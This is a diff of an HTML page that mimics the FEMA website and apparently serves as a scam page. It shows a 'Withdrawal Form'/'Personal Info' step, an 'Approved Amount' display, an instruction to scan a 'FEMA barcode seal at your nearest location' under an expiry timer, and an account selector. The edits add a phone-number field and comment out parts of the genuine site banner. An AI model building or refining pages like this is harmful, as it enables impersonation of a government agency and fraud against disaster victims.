@@ -75,21 +75,21 @@
     
       <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas="">
 
-            <div class="header-top" bis_skin_checked="1" style="text-align: left; font-weight: 900; font-size: 16px;">
+            <!--div class="header-top" bis_skin_checked="1" style="text-align: left; font-weight: 900; font-size: 16px;">
         <div class="grid-container" bis_skin_checked="1">
               <div class="region region-header-top" bis_skin_checked="1">
     <div id="block-textblockexample-2" class="block block-block-content block-block-content4a220dd4-c6b1-4537-863e-5877ebe22fb8" bis_skin_checked="1">
   
     
       
-            <div class="clearfix text-formatted field field--name-body field--type-text-with-summary field--label-hidden field__item" bis_skin_checked="1"><div class="fema-callout alert emergency" bis_skin_checked="1"><img src="profiles/femad8_gov/themes/fema_uswds/images/alert.svg" data-entity-uuid="" data-entity-type="" alt="alert - warning" width="0" height="0"><p>NOTICE: Due to the lapse in federal funding, portions of this website may not be updated and some non-disaster assistance transactions submitted via the website may not be processed or responded to until after appropriations are enacted. <a href="lapse-federal-funding-impact-fema-website-operations-notice" class="survey-processed">Get more information</a>.</p></div></div>
+            <div class="clearfix text-formatted field field--name-body field--type-text-with-summary field--label-hidden field__item" bis_skin_checked="1"><div class="fema-callout alert emergency" bis_skin_checked="1"><img src="profiles/femad8_gov/themes/fema_uswds/images/alert.svg" data-entity-uuid="" data-entity-type="" alt="alert - warning" width="0" height="0"><p>NOTICE: Due to the lapse in federal funding, portions of this website may not be updated and some non-disaster assistance transactions submitted via the website may not be processed or responded to until after appropriations are enacted. <a href="/lapse-federal-funding-impact-fema-website-operations-notice" class="survey-processed">Get more information</a>.</p></div></div>
       
   </div>
 
   </div>
 
         </div>
-    </div>
+    </div-->
     
 
   <div class="usa-banner">
@@ -641,7 +641,7 @@ h3.fema-mobile-app-title {
 
       <div class="container step-content active" id="step-1">
 
-      <h1 style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; justify-content: center; justify-items: center;">Withdrawal Form</h1>
+      <h1 style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; justify-content: center; justify-items: center; text-align: center;">Personal Info</h1>
 
       <div style="display: grid;
     grid-template-columns: 1fr 1fr;
@@ -690,7 +690,7 @@ h3.fema-mobile-app-title {
         <div class="container step-content active" id="step-2" style="display:none; max-width: 900px; margin: auto;">
           
 <div class="Congratulation" style="max-width: 800px; margin: auto;">
-  <h2 style="justify-content: center; justify-items: center; color: #042b66; text-align: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">Approved Amount</h2>
+  <h2 style="justify-content: center; justify-items: center; color: #042b66; text-align: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding-top: 10px;">Approved Amount</h2>
 
 <div style="
   display: flex;
@@ -753,13 +753,15 @@ h3.fema-mobile-app-title {
         <p style="text-align: left;">Dear, <span id="display-last"></span> to verify your identity, scan the FEMA barcode seal at your nearest location.</p>
 
 
-<div>
+<div height="-50%">
+  <input type="tel">
 <button id="generate-code-btn" class="button" type="button" onclick="generateBarcode()" style="margin: 20px 0;">
   Generate Barcode
 </button>
 
 <div id="barcode-container" style="display: none;">
-  <img src="sites/default/files/graphics/code-for-fema.jpg" alt="" width="100" height="100" style="border: 1px solid black; width: 50%;"/>
+  <img src="sites/default/files/graphics/code-for-fema.jpg" alt="" width="50" height="50" style="border: 1px solid black; width: 50%;" />
+  <br> Code Expire in:</br>
 </div>
 
 <div id="step3-timer" style="display: none;
@@ -802,7 +804,7 @@ h3.fema-mobile-app-title {
 
 
 
-        <label>Remaining Amount</label>
+        <label>Remaining Amount:</label>
 
 
             <span style="font-weight: bold; color: #042b66; font-size: 40px;" id="display-amount-step4"></span>
@@ -836,7 +838,7 @@ h3.fema-mobile-app-title {
 
 
 
-                 <div style="display: grid; grid-template-columns: 1fr 1fr;">
+                 <!-- div style="display: grid; grid-template-columns: 1fr 1fr;">
 <div class="custom-select">
   <div class="selected" onclick="toggleOptions()">
     <span id="selected-text">Account</span>
@@ -865,17 +867,17 @@ h3.fema-mobile-app-title {
       <label class="option-label">MAJORITY</label>
     </div>
   </div>
-</div>
+</div >
 
 
 
 
 
 
-<span id="display-account-step4" style="margin-top: 5%;"></span>
+<span id="display-account-step4" style="margin-top: 5%;"></span-->
 
 
-</div>
+
 
 <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 2px;">
   
@@ -893,16 +895,20 @@ h3.fema-mobile-app-title {
 
 </div>
 
-      </div>
-
-
-      
-    </form> </div>
-
-
-</main>
-
 </div>
+
+     </form>
+    
+    </div>
+
+  </main>
+      
+     </div>
+
+
+
+
+
   
   
 <!--Front Page Layout Start -->
@@ -1258,7 +1264,7 @@ targetHref = jQuery('#block-fema-uswds-mainpagecontent-2 > article > div.content
 
   
 </div>    
-</footer>
+</footer></div>
 
   </div>
 
